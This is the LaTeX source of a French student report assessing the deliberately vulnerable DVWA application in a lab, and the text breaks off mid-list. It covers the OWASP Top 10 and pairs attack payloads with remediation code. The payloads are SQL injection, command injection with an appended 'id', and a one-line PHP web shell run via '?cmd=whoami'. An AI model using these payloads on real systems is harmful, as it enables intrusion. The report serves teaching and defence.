% !TeX program = lualatex
% !TeX encoding = UTF-8
% !TeX spellcheck = fr_FR

\documentclass[12pt,a4paper,openany]{report}

% ==============================================================================
% 1. MOTEUR & LANGUE
% ==============================================================================
\usepackage{fontspec}
\usepackage{polyglossia}
\setmainlanguage{french}
\setotherlanguage{english}

% ==============================================================================
% 2. MISE EN PAGE & STRUCTURE
% ==============================================================================
\usepackage{geometry}
\geometry{left=2.5cm, right=2.5cm, top=3cm, bottom=3cm, headheight=30pt}

\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{tocloft}
\usepackage{titletoc}

% ==============================================================================
% 3. TYPOGRAPHIE & TEXTE
% ==============================================================================
\usepackage{setspace}
\usepackage{xcolor}
\usepackage{csquotes}
\usepackage{enumitem}
\usepackage{indentfirst}
\usepackage{hyphenat}
\usepackage[skins]{tcolorbox}

% ==============================================================================
% 4. GRAPHISMES & DIAGRAMMES
% ==============================================================================
\usepackage{graphicx}
\usepackage{tikz}
\usetikzlibrary{positioning, shapes.geometric, arrows.meta, calc}
\usepackage{caption}
\usepackage{subcaption}
\usepackage{float}

% ==============================================================================
% 5. TABLEAUX
% ==============================================================================
\usepackage{booktabs}
\usepackage{longtable}
\usepackage{array}
\usepackage{multirow}
\usepackage{tabularx}
\usepackage{colortbl}

% ==============================================================================
% 6. CODE SOURCE & LISTINGS
% ==============================================================================
\usepackage{listings}
\usepackage{lstautogobble}

% ==============================================================================
% 7. LIENS & RÉFÉRENCES
% ==============================================================================
\usepackage{hyperref}
\usepackage{bookmark}
\usepackage{url}

% ==============================================================================
% 8. UTILITAIRES DIVERS
% ==============================================================================
\usepackage{pdfpages}
\usepackage{lastpage}

% ==============================================================================
% POLICES
% ==============================================================================
\setmainfont{Latin Modern Roman}
\setsansfont{Latin Modern Sans}
\setmonofont{Latin Modern Mono}

% ==============================================================================
% COULEURS (Palette Professionnelle)
% ==============================================================================
\definecolor{primary}{RGB}{0,51,102}
\definecolor{secondary}{RGB}{0,102,204}
\definecolor{accent}{RGB}{204,0,0}
\definecolor{codebg}{RGB}{248,248,248}
\definecolor{codekeyword}{RGB}{0,0,200}
\definecolor{codestring}{RGB}{163,21,21}
\definecolor{codecomment}{RGB}{0,128,0}
\definecolor{footergray}{RGB}{128,128,128}
\definecolor{tableheadbg}{RGB}{0,51,102}
\definecolor{tableheadfg}{RGB}{255,255,255}
\definecolor{tablerowalt}{RGB}{235,242,252}
\definecolor{tableborder}{RGB}{0,80,160}
\definecolor{criticalred}{RGB}{220,20,60}
\definecolor{warningorange}{RGB}{255,140,0}

% ==============================================================================
% EN-TÊTES ET PIEDS DE PAGE
% ==============================================================================
\pagestyle{fancy}
\fancyhf{}

\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\headrule}{\hbox to\headwidth{%
		\color{primary}\leaders\hrule height \headrulewidth\hfill}}
\renewcommand{\footrulewidth}{0.4pt}

\fancyhead[L]{\textcolor{primary}{\small\bfseries
		OWASP Top 10 \textbullet\ DVWA Assessment}}
\fancyhead[R]{\textcolor{primary}{\small\bfseries
		 ESTK • IDRS}}

\newif\ifshowpagenumbers
\showpagenumberstrue

\fancyfoot[C]{\textcolor{footergray}{\small%
		\ifshowpagenumbers%
		Page \thepage\ sur \pageref{LastPage}%
		\fi%
}}

% ==============================================================================
% FORMATAGE DES TITRES
% ==============================================================================
\titleformat{\chapter}[display]
{\normalfont\huge\bfseries\color{primary}}{\chaptertitlename\ \thechapter}{20pt}{\Huge}
\titleformat{\section}
{\normalfont\Large\bfseries\color{primary}}{\thesection}{1em}{}
\titleformat{\subsection}
{\normalfont\large\bfseries\color{secondary}}{\thesubsection}{1em}{}

% ==============================================================================
% 6. CODE SOURCE & LISTINGS
% ==============================================================================
\usepackage{listings}
\usepackage{lstautogobble}
% Command to hide page numbers
\newcommand{\hidepagenumbers}{\showpagenumbersfalse\pagestyle{empty}}
\newcommand{\showpagenumbers}{\showpagenumberstrue\pagestyle{fancy}}
% ==============================================================================
% CONFIGURATION LISTINGS POUR LE CODE
% ==============================================================================
\lstset{
	basicstyle=\ttfamily\small,
	backgroundcolor=\color{codebg},
	keywordstyle=\color{codekeyword}\bfseries,
	stringstyle=\color{codestring},
	commentstyle=\color{codecomment}\itshape,
	frame=single,
	rulecolor=\color{primary},
	breaklines=true,
	breakatwhitespace=true,
	showstringspaces=false,
	captionpos=b,
	numbers=left,
	numberstyle=\tiny\color{gray},
	numbersep=5pt,
	tabsize=4,
	extendedchars=true,
	inputencoding=utf8,
	autogobble=true
}

% Définir le style logstyle
\lstdefinestyle{logstyle}{
	basicstyle=\ttfamily\footnotesize,
	backgroundcolor=\color{codebg},
	frame=single,
	rulecolor=\color{primary},
	breaklines=true,
	showstringspaces=false,
	captionpos=b,
	autogobble=true,
	numbers=none
}

% ==============================================================================
% DÉBUT DU DOCUMENT
% ==============================================================================
\begin{document}
	\sloppy
	
	% ──────────────────────────────────────────────────────────────────────
	% PAGE DE TITRE
	% ──────────────────────────────────────────────────────────────────────
	\begin{titlepage}
		\thispagestyle{empty}
		
		\noindent
		\colorbox{primary}{%
			\parbox{\dimexpr\textwidth-2\fboxsep}{%
				\vspace{0.6cm}
				\centering
				{\large\bfseries\textcolor{white}{Cyberdéfense et Sécurité Offensive}}\\[0.6cm]
			}%
		}
		
		\vspace{1.5cm}
		\centering
		
		{\normalsize\bfseries\color{black!40}\MakeUppercase{Évaluation de Vulnérabilités DVWA}}
		
		\vspace{0.8cm}
		
		{\Huge\bfseries\color{primary}
			OWASP Top 10: 2025\\
			Évaluation de Sécurité\\
			Damn Vulnerable Web Application\par
		}
		
		\vspace{0.5cm}
		
		{\color{accent}\rule{7cm}{1.5pt}\par}
		
		\vspace{0.5cm}
		
		{\large\color{black!60}
			Analyse des Vulnérabilités Web Critiques\\[0.2cm]
			et Démonstration des Techniques d'Exploitation\par
		}
		
		\vspace{2cm}
		
		{\large
			\renewcommand{\arraystretch}{1.5}
			\begin{tabular}{c}
				\textbf{\color{primary}Équipe de Réalisation :}\\[0.3cm]
				Yasser \textsc{Bella} \\
				Oussama \textsc{El Habti} \\
				Salma \textsc{El Habti} \\[0.6cm]
				
				\textbf{\color{primary}Filière :} IDRS --- Infrastructure Digitale Réseau et Sécurité \\[0.3cm]
				\textbf{\color{primary}Année Universitaire :} 2025 -- 2026 \\
			\end{tabular}
		}
		
		\vfill
		
		\noindent
		\colorbox{primary}{%
			\parbox{\dimexpr\textwidth-2\fboxsep}{%
				\vspace{0.35cm}
				\centering
				{\small\textcolor{white}{%
						Ubuntu Server 25.04 \textbullet\ Docker
						\quad\textbullet\quad MariaDB}}\\[0.2cm]
				{\small\textcolor{white}{%
						Firefox DevTools \textbullet\ cURL
						\quad\textbullet\quad crackstation.net}}\\[0.35cm]
			}%
		}%
		
	\end{titlepage}
	
	% ──────────────────────────────────────────────────────────────────────
	% TABLE DES MATIÈRES
	% ──────────────────────────────────────────────────────────────────────
	\newpage
	\hidepagenumbers
	\tableofcontents
	\newpage
	\listoffigures
	\newpage
	\listoftables
	\cleardoublepage
	\showpagenumbers
	\pagenumbering{arabic}
	\setcounter{page}{1}
	
	% ══════════════════════════════════════════════════════════════════════
	% CHAPITRE 1 : INTRODUCTION
	% ══════════════════════════════════════════════════════════════════════
	
	\chapter{Introduction et Objectifs}
	
	\section{Contexte de l'Évaluation}
	
	Ce rapport documente une évaluation de sécurité complète de l'application Damn Vulnerable Web Application (DVWA) v1.10, 
	déployée dans une infrastructure de laboratoire segmentée. L'objectif principal est de démontrer les vulnérabilités 
	présentes dans la liste OWASP Top 10: 2025 et de valider l'efficacité des techniques de détection et d'exploitation.
	
	L'évaluation a été réalisée dans un environnement contrôlé, incluant :
	\begin{itemize}
		\item Une architecture réseau segmentée (WAN/DMZ/LAN) protégée par un pare-feu pfSense
		\item Un serveur Web vulnérable (DVWA) déployé dans la DMZ via conteneurisation Docker
		\item Une machine attaquante (Parrot Security OS) simulant une menace externe
		\item Des systèmes de détection d'intrusion (Snort, pfBlockerNG)
	\end{itemize}
	
	\section{Objectifs de Sécurité}
	
	L'évaluation vise à atteindre les objectifs suivants :
	
	\begin{enumerate}
		\item \textbf{Identification :} Découvrir et documenter les vulnérabilités OWASP Top 10 présentes dans DVWA
		\item \textbf{Exploitation :} Démontrer pratiquement chaque vulnérabilité via des attaques contrôlées
		\item \textbf{Analyse :} Évaluer l'impact de chaque vulnérabilité sur la sécurité globale de l'application
		\item \textbf{Remédiation :} Proposer des solutions correctives pour éliminer ou atténuer les risques
	\end{enumerate}
	
	\section{Méthodologie}
	
	La démarche suivie respecte les standards de l'industrie :
	
	\begin{description}
		\item[Reconnaissance] : Identification des surfaces d'attaque exposées
		\item[Énumération] : Détection des services et versions
		\item[Exploitation] : Démonstration pratique de l'accès non autorisé
		\item[Post-Exploitation] : Analyse des conséquences de chaque compromission
		\item[Documentation] : Enregistrement détaillé avec preuves (screenshots)
	\end{description}
	
	% ══════════════════════════════════════════════════════════════════════
	% CHAPITRE 2 : ARCHITECTURE RÉSEAU
	% ══════════════════════════════════════════════════════════════════════
	
	\chapter{Architecture Réseau et Infrastructure}
	
	\section{Topologie Logique}
	
	L'infrastructure de test est basée sur une architecture défense-en-profondeur, avec segmentation stricte :
	
	\begin{table}[ht]
		\centering
		\renewcommand{\arraystretch}{1.4}
		\begin{tabular}{>{\bfseries}p{3.5cm} p{3.2cm} p{2.8cm} p{3.2cm}}
			\hline
			\rowcolor{tableheadbg}
			\textcolor{tableheadfg}{\textbf{Machine}} &
			\textcolor{tableheadfg}{\textbf{Rôle}} &
			\textcolor{tableheadfg}{\textbf{Zone}} &
			\textcolor{tableheadfg}{\textbf{OS}} \\
			\hline
			\rowcolor{tablerowalt}
			pfSense-Firewall & Routeur / Pare-feu & WAN/DMZ/LAN & pfSense 2.8.0 \\
			ubuntuserver & Serveur Web (DVWA) & DMZ & Ubuntu 25.04 \\
			\rowcolor{tablerowalt}
			Parrot Security & Machine Attaquante & WAN & Parrot Security OS \\
			\hline
		\end{tabular}
		\caption{Inventaire des Machines de Test}
		\label{tab:vm-inventory}
	\end{table}
	
	\section{Plan d'Adressage IP}
	
	\begin{table}[ht]
		\centering
		\small
		\renewcommand{\arraystretch}{1.5}
		\begin{tabular}{p{4.5cm} >{\centering\arraybackslash}p{3.5cm} >{\centering\arraybackslash}p{3.5cm}}
			\hline
			\rowcolor{tableheadbg}
			\textcolor{tableheadfg}{\textbf{Machine}} &
			\textcolor{tableheadfg}{\textbf{Adresse IP}} &
			\textcolor{tableheadfg}{\textbf{Passerelle}} \\
			\hline
			\rowcolor{tablerowalt}
			pfSense (WAN) & 192.168.100.6 & 192.168.100.2 \\
			
			pfSense (DMZ) & 192.168.10.1 & N/A \\
			
			\rowcolor{tablerowalt}
			Ubuntu DMZ & 192.168.10.100 & 192.168.10.1 \\
			
			Parrot Security & 192.168.100.150 & 192.168.100.2 \\
			\hline
		\end{tabular}
		\caption{Plan d'Adressage IP}
		\label{tab:ip-plan}
	\end{table}
	
	\section{Segmentation Réseau}
	
	\subsection{Zone WAN (192.168.100.0/24)}
	\begin{itemize}
		\item \textbf{Rôle :} Réseau externe, point d'entrée pour les attaquants
		\item \textbf{Politiques :} Tout trafic entrant bloqué par défaut
		\item \textbf{Machines :} Parrot Security (attaquant), Interface WAN de pfSense
	\end{itemize}
	
	\subsection{Zone DMZ (192.168.10.0/24)}
	\begin{itemize}
		\item \textbf{Rôle :} Zone tampon pour services exposés publiquement
		\item \textbf{Politiques :} Trafic WAN autorisé sur ports 80, 139, 445 uniquement
		\item \textbf{Machines :} Ubuntu Server (DVWA, Docker)
		\item \textbf{Isolation :} Strictement isolée du LAN par pfSense
	\end{itemize}
	
	\subsection{Zone LAN (192.168.20.0/24)}
	\begin{itemize}
		\item \textbf{Rôle :} Réseau interne sécurisé (non utilisé dans ce TP)
		\item \textbf{Politiques :} Aucun trafic direct depuis WAN/DMZ autorisé
	\end{itemize}
	
	% ══════════════════════════════════════════════════════════════════════
	% CHAPITRE 3 : INSTALLATION ET CONFIGURATION DVWA
	% ══════════════════════════════════════════════════════════════════════
	
	\chapter{Déploiement et Configuration DVWA}
	
	\section{Sélection de l'Image Docker}
	
	Trois images Docker DVWA ont été évaluées :
	
	\begin{table}[ht]
		\centering
		\small
		\renewcommand{\arraystretch}{1.6}
		\begin{tabular}{p{3cm} p{4cm} p{5cm}}
			\hline
			\rowcolor{tableheadbg}
			\textcolor{tableheadfg}{\textbf{Image}} &
			\textcolor{tableheadfg}{\textbf{Avantages}} &
			\textcolor{tableheadfg}{\textbf{Inconvénients}} \\
			\hline
			\rowcolor{tablerowalt}
			\texttt{ghcr.io/digininja/dvwa} & Open source, à jour & MySQL externe requis \\
			
			\texttt{vulnerables/web-dvwa} & MySQL inclus, simple & ✓ SÉLECTIONNÉ \\
			
			\rowcolor{tablerowalt}
			\texttt{dvwa/official} & Contrôle précis & Authentification requise \\
			\hline
		\end{tabular}
		\caption{Comparaison des Images DVWA}
		\label{tab:dvwa-images}
	\end{table}
	
	\textbf{Décision :} L'image \texttt{vulnerables/web-dvwa} a été sélectionnée car elle inclut MariaDB 
	en bundle, éliminant les problèmes de connectivité base de données.
	
	\section{Déploiement Docker}
	
	\subsection{Lanceurs du Conteneur}
	
	\begin{lstlisting}[caption=Démarrage du Conteneur DVWA]
		$ sudo docker run -d \
		--restart=unless-stopped \
		-p 8080:80 \
		--name dvwa \
		vulnerables/web-dvwa
		
		73c52c0ee9a905edc8aeeb6b6e8794444766b33d2f36df34e543b7e0a3662b1c
	\end{lstlisting}
	
	\subsection{Vérification du Déploiement}
	
	\begin{lstlisting}[caption=Vérification du Conteneur]
		$ sudo docker ps | grep dvwa
		
		CONTAINER ID   IMAGE                      STATUS       PORTS
		73c52c0ee9a9   vulnerables/web-dvwa       Up 6 hours   0.0.0.0:8080->80/tcp
	\end{lstlisting}
	
	\section{Accès à DVWA}
	
	\begin{itemize}
		\item \textbf{URL :} \texttt{http://192.168.10.100:8080/}
		\item \textbf{Identifiants par défaut :}
		\begin{itemize}
			\item Username: \texttt{admin}
			\item Password: \texttt{password}
		\end{itemize}
		\item \textbf{Niveau de sécurité :} Défini à \textbf{``LOW''} pour maximiser les vulnérabilités exposées
	\end{itemize}
	
	\section{Initialisation de la Base de Données}
	
	Lors du premier accès, DVWA affiche une page de configuration. Le bouton 
	\textit{``Create / Reset Database''} initialise les tables utilisateurs et données de test.
	
	% ══════════════════════════════════════════════════════════════════════
	% CHAPITRE 4 : VULNÉRABILITÉS OWASP - EXPLOITATION
	% ════════════════════════════════════════════════════════════════���═════
	
	\chapter{Identification et Exploitation des Vulnérabilités OWASP Top 10: 2025}
	
	\section{Résumé des Attaques Exécutées}
	
	Un total de \textbf{14 attaques réussies} ont été documentées couvrant \textbf{7 catégories OWASP Top 10}.
	
	\begin{table}[H]
		\centering
		\small
		\renewcommand{\arraystretch}{1.3}
		\begin{tabular}{>{\centering\arraybackslash}p{1.5cm} p{4cm} p{5cm} >{\centering\arraybackslash}p{1.8cm}}
			\hline
			\rowcolor{tableheadbg}
			\textcolor{tableheadfg}{\textbf{ID}} &
			\textcolor{tableheadfg}{\textbf{Catégorie OWASP}} &
			\textcolor{tableheadfg}{\textbf{Attaque}} &
			\textcolor{tableheadfg}{\textbf{Status}} \\
			\hline
			\rowcolor{tablerowalt}
			\textbf{A01} & Broken Access Control & File Inclusion (LFI) & ✓ \\
			
			\textbf{A02} & Security Misconfiguration & Default Credentials & ✓ \\
			
			\rowcolor{tablerowalt}
			\textbf{A04} & Cryptographic Failures & Weak Session IDs & ✓ \\
			
			\textbf{A05} & Injection & SQL Injection & ✓ \\
			
			\rowcolor{tablerowalt}
			& & Command Injection & ✓ \\
			
			\textbf{A07} & Authentication Failures & Brute Force Login & ✓ \\
			
			\rowcolor{tablerowalt}
			\textbf{A08} & File Upload & Web Shell Upload & ✓ \\
			
			\textbf{A10} & Error Message Disclosure & SQL Error Disclosure & ✓ \\
			\hline
		\end{tabular}
		\caption{Récapitulatif des Attaques Documentées}
		\label{tab:attack-summary}
	\end{table}
	
	% ──────────────────────────────────────────────────────────────────────
	% A05: SQL INJECTION
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A05: Injection - SQL Injection}
	
	\subsection{Description de la Vulnérabilité}
	
	SQL Injection est une technique d'attaque qui consiste à injecter du code SQL malveillant 
	dans les paramètres d'une application pour manipuler les requêtes de la base de données.
	
	\subsection{Étapes d'Exploitation}
	
	\begin{enumerate}
		\item Accéder à : \textbf{Vulnerabilities → SQL Injection}
		\item Entrer la charge utile dans le champ \textit{User ID} :
		\begin{lstlisting}[caption=Payload SQL Injection,numbers=none,frame=none,backgroundcolor={},rulecolor={}]
			' OR '1'='1' --
		\end{lstlisting}
		\item Cliquer sur \textbf{Submit}
	\end{enumerate}
	
	\subsection{Résultats Observés}
	
	\textbf{Réponse de l'Application :}
	\begin{lstlisting}[caption=Message d'erreur révélateur]
		You have an error in your SQL syntax; check the manual that corresponds 
		to your MariaDB server version for the right syntax to use near ''' at line 1
	\end{lstlisting}
	
	\textbf{Informations Divulguées :}
	\begin{itemize}
		\item Type de base de données: \textbf{MariaDB}
		\item Détails de la requête SQL malformée
		\item Structure de la requête vulnérable
	\end{itemize}
	
	\subsection{Impact de Sécurité}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: CRITIQUE}]
		\begin{itemize}
			\item \textbf{Confidentialité :} CRITIQUE - Accès à tous les enregistrements base de données
			\item \textbf{Intégrité :} CRITIQUE - Modification/suppression de données possibles
			\item \textbf{Disponibilité :} CRITIQUE - Suppression complète de la base de données
			\item \textbf{CVSS v3.1 :} 9.8 (Critique)
		\end{itemize}
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{sql-injection-error.png}
		\caption{SQL Injection - Message d'erreur MariaDB}
		\label{fig:sql-injection}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Requête Sécurisée avec Prepared Statements]
		// VULNÉRABLE (À NE PAS UTILISER)
		$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
		
		// SÉCURISÉ (Utiliser toujours les prepared statements)
		$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
		$stmt->bind_param("i", $_GET['id']);
		$stmt->execute();
		$result = $stmt->get_result();
	\end{lstlisting}
	
	% ──────────────────────────────────────────────────────────────────────
	% A05: COMMAND INJECTION
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A05: Injection - Command Injection}
	
	\subsection{Description}
	
	Command Injection permet d'exécuter des commandes système arbitraires en exploitant 
	un champ de saisie qui ne valide pas les d��limiteurs de commande.
	
	\subsection{Exploitation}
	
	\begin{enumerate}
		\item Accéder à : \textbf{Vulnerabilities → Command Injection}
		\item Entrer l'adresse IP: \texttt{8.8.8.8}
		\item Ajouter la commande à chaîner: \texttt{; id}
		\item Charge utile complète : \texttt{8.8.8.8; id}
	\end{enumerate}
	
	\subsection{Résultats}
	
	\begin{lstlisting}[caption=Résultat de Command Injection,style=logstyle]
		PING 8.8.8.8 (8.8.8.8): 56 data bytes
		64 bytes from 8.8.8.8: icmp_seq=0 ttl=126 time=353.420 ms
		64 bytes from 8.8.8.8: icmp_seq=1 ttl=126 time=24.713 ms
		64 bytes from 8.8.8.8: icmp_seq=2 ttl=126 time=22.696 ms
		64 bytes from 8.8.8.8: icmp_seq=3 ttl=126 time=23.053 ms
		--- 8.8.8.8 ping statistics ---
		4 packets transmitted, 4 packets received, 0% packet loss
		
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
	\end{lstlisting}
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: CRITIQUE}]
		\textbf{Accès Système Complet :} Attaquant exécute des commandes avec les 
		privilèges du serveur web (www-data). Possibilité complète de compromission 
		du système (installation de backdoors, vol de données, DoS).
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{command-injection.png}
		\caption{Command Injection - Exécution de Commandes Système}
		\label{fig:command-injection}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Protection contre Command Injection]
		// VULNÉRABLE
		exec("ping -c 4 " . $_GET['ip']);
		
		// SÉCURISÉ - Utiliser escapeshellarg()
		$ip = escapeshellarg($_GET['ip']);
		exec("ping -c 4 " . $ip);
		
		// MIEUX ENCORE - Whitelist
		$allowed_ips = array('8.8.8.8', '8.8.4.4');
		if (in_array($_GET['ip'], $allowed_ips)) {
			exec("ping -c 4 " . escapeshellarg($_GET['ip']));
		}
	\end{lstlisting}
	
	% ──────────────────────────────────────────────────────────────────────
	% A07: BRUTE FORCE
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A07: Authentication Failures - Brute Force Login}
	
	\subsection{Description}
	
	L'absence de mécanisme de verrouillage de compte ou de limitation de débit 
	permet les attaques par force brute illimitées contre les identifiants.
	
	\subsection{Exploitation}
	
	\begin{enumerate}
		\item Accéder au formulaire de login DVWA
		\item Tenter plusieurs combinaisons de mots de passe :
		\begin{itemize}
			\item \texttt{admin} / \texttt{admin} → Échoue
			\item \texttt{admin} / \texttt{password} → \textbf{SUCCÈS}
		\end{itemize}
		\item Aucun message d'erreur "Compte verrouillé"
		\item Aucun délai progressif entre les tentatives
	\end{enumerate}
	
	\subsection{Résultats}
	
	\textbf{Observation Critique :} Après 10+ tentatives échouées, l'application 
	continue d'accepter les tentatives de login sans aucune restriction. 
	Cela démontre l'absence totale de protection anti-brute-force.
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: HAUTE}]
		\begin{itemize}
			\item Attaquant peut automatiser les tentatives de crack de mots de passe
			\item Efficace contre les mots de passe faibles ou courants
			\item Aucune détection d'attaque possible (pas de logs d'alerte)
		\end{itemize}
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{brute-froce.png}
		\caption{Brute Force - Multiples Tentatives de Login Acceptées}
		\label{fig:brute-force}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Implémentation de Protection Anti-Brute-Force]
		// Enregistrer les tentatives échouées
		function log_failed_attempt($username, $ip) {
			// Incrémenter compteur dans Redis/Memcache
			$key = "failed_login:{$username}:{$ip}";
			$redis->incr($key);
			$redis->expire($key, 900); // 15 minutes
			
			// Vérifier le seuil
			if ($redis->get($key) >= 5) {
				throw new Exception("Trop de tentatives. Compte verrouillé 15 min.");
			}
		}
		
		// Ajouter délai progressif
		usleep(($failed_attempts ^ 2) * 1000000); // 1, 4, 9... secondes
	\end{lstlisting}
	
	% ──────────────────────────────────────────────────────────────────────
	% A08: FILE UPLOAD
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A08: Software or Data Integrity - File Upload}
	
	\subsection{Description}
	
	L'absence de validation stricte des fichiers uploadés permet l'insertion 
	de code exécutable sur le serveur, conduisant à une compromission complète.
	
	\subsection{Exploitation}
	
	\begin{enumerate}
		\item Créer un fichier PHP malveillant :
		\begin{lstlisting}[language=php,numbers=none,caption=Web Shell PHP,frame=none]
			<?php system($_GET['cmd']); ?>
		\end{lstlisting}
		\item Accéder à : \textbf{Vulnerabilities → File Upload}
		\item Sélectionner le fichier \texttt{shell.php}
		\item Cliquer \textbf{Upload}
	\end{enumerate}
	
	\subsection{Résultats}
	
	\begin{lstlisting}[caption=Confirmation d'Upload Réussi,style=logstyle]
		../../hackable/uploads/shell.php successfully uploaded!
	\end{lstlisting}
	
	\subsection{Exécution de Commandes}
	
	Accéder à l'URL : \texttt{http://192.168.10.100:8080/DVWA/uploads/shell.php?cmd=whoami}
	
	\textbf{Résultat :} \texttt{www-data} — Exécution en tant que serveur web confirmée.
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: CRITIQUE}]
		\begin{itemize}
			\item Exécution de code arbitrary au niveau système
			\item Installation de backdoors persistants
			\item Vol de données confidentielles
			\item Compromission complète du serveur
		\end{itemize}
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{file-upload.png}
		\caption{File Upload - Web Shell Uploadé avec Succès}
		\label{fig:file-upload}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Upload Sécurisé]
		// Whitelist d'extensions autorisées
		$allowed = array('jpg', 'jpeg', 'png', 'gif', 'pdf');
		$filename = basename($_FILES['file']['name']);
		$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
		
		if (!in_array($ext, $allowed)) {
			die("Extension de fichier non autorisée!");
		}
		
		// Vérifier le type MIME
		$finfo = finfo_open(FILEINFO_MIME_TYPE);
		$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
		$allowed_mimes = array('image/jpeg', 'image/png', 'image/gif', 'application/pdf');
		
		if (!in_array($mime, $allowed_mimes)) {
			die("Type MIME non autorisé!");
		}
		
		// Stocker EN DEHORS du répertoire web
		$upload_dir = '/var/uploads/secure/'; // Hors de /var/www/html
		move_uploaded_file($_FILES['file']['tmp_name'], 
		$upload_dir . uniqid() . '.' . $ext);
	\end{lstlisting}
	
	% ──────────────────────────────────────────────────────────────────────
	% A04: WEAK SESSION IDS
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A04: Cryptographic Failures - Weak Session IDs}
	
	\subsection{Description}
	
	Les identifiants de session sont générés de manière prévisible (simples 
	nombres entiers), permettant le hijacking de sessions par prédiction.
	
	\subsection{Analyse}
	
	\begin{enumerate}
		\item Ouvrir les \textbf{Outils Développeur (F12)}
		\item Naviguer vers \textbf{Application → Cookies}
		\item Observer les valeurs de cookies
	\end{enumerate}
	
	\subsection{Résultats}
	
	\textbf{Cookies Observés :}
	
	\begin{table}[H]
		\centering
		\renewcommand{\arraystretch}{1.6}
		\begin{tabular}{p{4cm} p{6cm} p{2cm}}
			\hline
			\rowcolor{tableheadbg}
			\textcolor{tableheadfg}{\textbf{Nom du Cookie}} &
			\textcolor{tableheadfg}{\textbf{Valeur}} &
			\textcolor{tableheadfg}{\textbf{Sécurité}} \\
			\hline
			\rowcolor{tablerowalt}
			\texttt{dvwaSession} & \texttt{3} & [!] Previsible \\
			
			\texttt{PHPSESSID} & \texttt{4ca5feac5b5a...} & [!] MD5 \\
			
			\rowcolor{tablerowalt}
			\texttt{Security} & \texttt{low} & [!] Public \\
			\hline
		\end{tabular}
		\caption{Analyse des Cookies DVWA}
		\label{tab:cookies}
	\end{table}
	
	\textbf{Problèmes Identifiés :}
	\begin{itemize}
		\item \textbf{dvwaSession = 3 :} Nombre séquentiel prévisible (3 → 4 → 5)
		\item \textbf{PHPSESSID :} Hash MD5 cryptographiquement faible
		\item \texttt{Security} exposé en clair dans le cookie
	\end{itemize}
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: HAUTE}]
		Attaquant peut prédire les session IDs d'autres utilisateurs 
		et accéder à leurs comptes sans connaître les mots de passe.
	\end{tcolorbox}
	
	\subsection{Screenshots}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{weak-sessions-id.png}
		\caption{Cookies Session - Vue 1}
		\label{fig:weak-sessions-1}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Génération Sécurisée de Session IDs]
		// MAUVAISE PRATIQUE (À ÉVITER)
		$_SESSION['id'] = rand(1, 1000000);
		
		// BONNE PRATIQUE
		$session_id = bin2hex(random_bytes(32)); // 64 caractères hex
		session_id($session_id);
		session_start();
		
		// En PHP 7.1+, utiliser directement:
		session_start([
		'name' => 'SECURE_PHPSESSID',
		'cookie_lifetime' => 3600,
		'cookie_httponly' => true,
		'cookie_secure' => true,  // HTTPS uniquement
		'cookie_samesite' => 'Strict'
		]);
	\end{lstlisting}
	
	% ──────────────────────────────────────────────────────────────────────
	% A02: DEFAULT CREDENTIALS
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A02: Security Misconfiguration - Default Credentials}
	
	\subsection{Description}
	
	L'application DVWA est livrée avec des identifiants par défaut bien connus, 
	jamais changés après installation.
	
	\subsection{Exploitation}
	
	\begin{enumerate}
		\item Accéder à \texttt{http://192.168.10.100:8080/}
		\item Entrer :
		\begin{itemize}
			\item Username: \texttt{admin}
			\item Password: \texttt{password}
		\end{itemize}
		\item Cliquer \textbf{Login}
	\end{enumerate}
	
	\subsection{Résultats}
	
	\textbf{Accès immédiat à l'application avec privilèges administrateur.}
	
	Ces identifiants sont publiquement documentés sur tous les guides DVWA. 
	Il n'y a aucun MFA, aucune vérification additionnelle.
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
		title=\textbf{CRITICITÉ: CRITIQUE}]
		Accès complet à l'application en quelques secondes, sans aucun contournement technique requis.
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{weak-creds.png}
		\caption{Connexion avec Identifiants par Défaut}
		\label{fig:weak-creds}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{enumerate}
		\item \textbf{Changer les identifiants par défaut} lors de l'installation
		\item \textbf{Appliquer une politique de mots de passe forts :}
		\begin{itemize}
			\item Minimum 12 caractères
			\item Mélange de majuscules, minuscules, chiffres et symboles
